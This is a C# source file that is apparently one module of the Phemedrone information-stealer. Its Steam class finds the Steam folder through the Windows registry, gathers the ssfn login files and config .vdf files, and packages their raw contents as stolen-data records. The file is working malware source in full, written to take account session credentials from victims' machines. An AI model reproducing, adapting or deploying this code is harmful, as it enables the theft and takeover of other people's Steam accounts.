using Phemedrone.Classes;
using Phemedrone.Services;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;
using System;
using System.Linq;
using Phemedrone.Extensions;

namespace Phemedrone.Services
{
    public class Steam : IService
    {
        public override PriorityLevel Priority => PriorityLevel.Medium;

        protected override LogRecord[] Collect()
        {
            var array = new List<LogRecord>();
            var steamPath = NullableValue.Call(() =>
                (Registry.GetValue(@"HKEY_CURRENT_USER\Software\Valve\Steam", "SteamPath", null)));
            
            if (steamPath == null) return array.ToArray();
            if (!Directory.Exists((string)steamPath)) return array.ToArray();

            foreach (var files in new List<List<string>>()
                     {
                         FileManager.EnumerateFiles((string)steamPath, "*ssfn*", 1),
                         FileManager.EnumerateFiles((string)steamPath + "\\config", "*.vdf", 1)
                     })
            {
                array.AddRange(
                    from file in files
                    let content = NullableValue.Call(() => File.ReadAllBytes(file))
                    where content != null
                    select new LogRecord
                    {
                        Path = "Steam/" + file.Replace((string)steamPath + "\\", null),
                        Content = File.ReadAllBytes(file)
                    });
                ServiceCounter.HasSteam = true;
            }
            
            ServiceCounter.HasSteam = array.Count > 0;
            return array.ToArray();
        }
    }
}